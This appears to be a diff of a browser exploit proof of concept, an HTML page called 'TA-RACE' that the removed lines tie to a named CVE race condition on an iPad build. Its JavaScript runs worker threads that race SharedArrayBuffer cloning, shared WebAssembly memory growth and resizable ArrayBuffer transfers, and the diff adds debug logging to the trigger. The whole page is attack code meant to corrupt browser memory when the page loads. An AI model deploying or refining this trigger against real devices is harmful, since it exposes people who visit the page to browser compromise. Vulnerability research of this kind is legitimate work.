@@ -1,17 +1,14 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE CVE-2026-112659</title>
+<title>TA-RACE v2</title>
 <body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE] CVE-2026-112659 transferAnchors CAS race | target: iPad 27.0.1 (24A446)</div>
+<div id=o>[TA-RACE v2]</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>{o.textContent+="\n"+m;};
+window.addEventListener('error',e=>log("[ERROR] "+e.message+" @ "+(e.lineno||"?")));
 log("[*] UA: "+navigator.userAgent);
-log("[*] mode A: SAB shared to 2 workers, both cloning views");
-log("[*] mode B: resizable AB transfer ring main<->worker + concurrent resize");
-log("[*] mode C: shared WASM memory grown from 2 threads");
 
-// ---------- Mode A + C workers: shared SAB + shared WASM memory ----------
 const WK = `
 let u8=null, mem=null;
 onmessage = e => {
@@ -22,7 +19,7 @@ onmessage = e => {
       try { structuredClone(u8.subarray(0,256)); } catch(_) {}
       Atomics.store(u8, (i>>>0) & 0xFFFF, i & 0xFF);
       i++;
-      if ((i & 0x3FFFFF)===0) postMessage({tick:i, who:e.data.who});
+      if ((i & 0xFFFFF)===0) postMessage({tick:i, who:e.data.who});
     }
   }
   if (e.data.mem) {
@@ -35,56 +32,66 @@ onmessage = e => {
       if ((i & 0x1FFFFF)===0) postMessage({grow:i, who:e.data.who});
     }
   }
-};
-const wA = new Worker(URL.createObjectURL(new Blob([WK])));
-const wB = new Worker(URL.createObjectURL(new Blob([WK])));
+};`;
 
-// ---------- Mode B: transfer ring worker ----------
+log("[1] workers defined");
+let wA, wB;
+try {
+  wA = new Worker(URL.createObjectURL(new Blob([WK])));
+  log("[2] worker A created");
+  wB = new Worker(URL.createObjectURL(new Blob([WK])));
+  log("[3] worker B created");
+} catch(e){ log("[FAIL] worker create: "+e.name+" "+e.message); throw e; }
+
 const WK2 = `
-let ring=[];
 onmessage = e => {
-  const {abs, back} = e.data;
-  for (const ab of abs) {
+  for (const ab of e.data.abs) {
     try { new Uint8Array(ab)[0] = 0x41; } catch(_) {}
-    // adopt then send back -> next transferAnchors adoption
     try { postMessage({ab:[ab]}, [ab]); } catch(_) {}
   }
-};
-const wR = new Worker(URL.createObjectURL(new Blob([WK2])));
-
-// ---------- setup shared state ----------
-const sab = new SharedArrayBuffer(0x10000);
-wA.postMessage({sab, who:'A'});
-wB.postMessage({sab, who:'B'});
-log("[+] SAB 64KB shared to workers A and B");
-
-let memShared=null;
+};`;
+let wR;
 try {
-  memShared = new WebAssembly.Memory({initial:1, maximum:64, shared:true});
-  wA.postMessage({mem:memShared, who:'A'});
-  wB.postMessage({mem:memShared, who:'B'});
-  log("[+] shared WASM memory created + shared");
+  wR = new Worker(URL.createObjectURL(new Blob([WK2])));
+  log("[4] ring worker created");
+} catch(e){ log("[FAIL] ring worker: "+e.name+" "+e.message); throw e; }
+
+let sab;
+try {
+  sab = new SharedArrayBuffer(0x10000);
+  log("[5] SAB created");
+  wA.postMessage({sab, who:'A'});
+  log("[6] SAB -> A");
+  wB.postMessage({sab, who:'B'});
+  log("[7] SAB -> B");
+} catch(e){ log("[FAIL] SAB: "+e.name+" "+e.message); }
+
+try {
+  const m = new WebAssembly.Memory({initial:1, maximum:64, shared:true});
+  log("[8] shared WASM mem created");
+  wA.postMessage({mem:m, who:'A'});
+  wB.postMessage({mem:m, who:'B'});
+  log("[9] WASM mem shared");
 } catch(e){ log("[-] shared WASM blocked: "+e.name); }
 
+const ring=[];
 wR.onmessage = e => { try { ring.push(...e.data.ab); } catch(_){} };
+log("[10] ring handler set");
 
-// ---------- main loop: transfer ring + resize races + clone shared views ----------
 const mu8 = new Uint8Array(sab);
-let it=0, ringSz=0;
-const MAXRING = 64;
+let it=0;
+log("[*] entering main loop");
 while (true) {
-  // B: create resizable AB, transfer into ring, resize just before send (race window)
   const ab = new ArrayBuffer(256, {maxByteLength: 65536});
   try { ab.resize(4096); } catch(_) {}
-  if (ringSz < MAXRING) {
-    try { wR.postMessage({abs:[ab]}, [ab]); ringSz++; } catch(_) {}
-  } else if (ring.length) {
-    const back = ring.pop(); ringSz--;
-    try { wR.postMessage({abs:[back]}, [back]); ringSz++; } catch(_) {}
+  if (ring.length < 64) {
+    try { wR.postMessage({abs:[ab]}, [ab]); } catch(_) {}
+  } else {
+    const back = ring.pop();
+    try { wR.postMessage({abs:[back]}, [back]); } catch(_) {}
   }
-  // A: main also clones shared SAB view (3rd thread on same handle)
   try { structuredClone(mu8.subarray(0,256)); } catch(_) {}
   it++;
-  if ((it & 0x3FFFFF)===0) log("[*] it="+it+" ring="+ringSz+" heapMB="+((performance.memory?performance.memory.usedJSHeapSize:0)/1048576|0));
+  if ((it & 0x1FFFF)===0) log("[*] it="+it+" ring="+ring.length);
 }
 </script>
